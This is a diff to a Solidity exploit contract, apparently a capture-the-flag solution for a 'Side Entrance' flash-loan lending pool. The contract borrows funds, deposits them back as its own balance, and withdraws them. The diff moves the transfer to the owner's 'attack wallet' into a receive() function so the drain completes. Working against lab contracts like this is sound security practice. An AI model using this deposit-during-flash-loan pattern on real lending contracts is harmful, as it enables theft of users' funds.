@@ -14,12 +14,15 @@ contract AttackSideEntrance {
         pool.flashLoan(amount);
         //we then withdraw it
         pool.withdraw();
-        //and sent to money to the attack wallet
-        owner.transfer(address(this).balance);
     }
 
     function execute() external payable {
         // our flshloan will deposit the amt into the flashloan contract
         pool.deposit{value: address(this).balance}();
+    }
+
+    receive() external payable {
+        //and sent to money to the attack wallet
+        owner.transfer(address(this).balance);
     }
 }
